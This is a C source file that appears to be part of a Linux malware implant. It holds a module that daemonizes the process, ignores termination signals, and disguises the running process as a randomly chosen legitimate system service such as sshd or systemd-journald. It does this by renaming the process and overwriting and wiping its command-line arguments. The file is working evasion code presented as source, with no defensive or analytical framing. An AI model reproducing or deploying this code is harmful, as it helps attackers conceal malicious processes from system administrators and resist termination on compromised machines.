#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>
#include <syslog.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/mount.h>
#include <stddef.h>

#include "headers/hide.h"
#include "headers/rand.h"

static const char *service_list[] = {
    "/lib/systemd/systemd-journald",
    "/lib/systemd/systemd-udevd",
    "/usr/lib/accountsservice/accounts-daemon",
    "/usr/lib/snapd/snapd",
    "/usr/lib/upower/upowerd",
    "/usr/lib/packagekit/packagekitd",
    "/usr/lib/policykit-1/polkitd",
    "/usr/lib/fwupd/fwupd",
    "/usr/lib/boltd/boltd",
    "/usr/lib/udisks2/udisksd",
    "/usr/sbin/cron",
    "/usr/sbin/rsyslogd",
    "/usr/sbin/sshd",
    "/usr/sbin/NetworkManager",
    "/usr/sbin/cupsd",
    "/usr/bin/dbus-daemon"
};

static const char *mount_path[] = {
    "/bin/",
    "/usr/bin/",
    "/sbin/",
    "/usr/sbin/",
    "/lib/",
    "/usr/lib/",
    "/usr/lib64/"
};

void create_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (chdir("/") != 0) exit(EXIT_FAILURE);
    umask(0);

    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++)
        close(i);

    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);
    }
}

void hide(int argc, char **argv) {
    create_daemon();
    init_rand();

    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGURG, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    const int total = sizeof(service_list) / sizeof(service_list[0]);
    const char *new_name = service_list[rand_next() % total];

    prctl(PR_SET_NAME, (unsigned long)new_name);

    size_t name_len = strlen(new_name);
    size_t avail_len = strlen(argv[0]);

    if (name_len <= avail_len) {
        strncpy(argv[0], new_name, avail_len);
    } else {
        strncpy(argv[0], new_name, avail_len - 1);
        argv[0][avail_len - 1] = '\0';
    }

    for (int i = 1; i < argc; i++)
        memset(argv[i], 0, strlen(argv[i]));
}
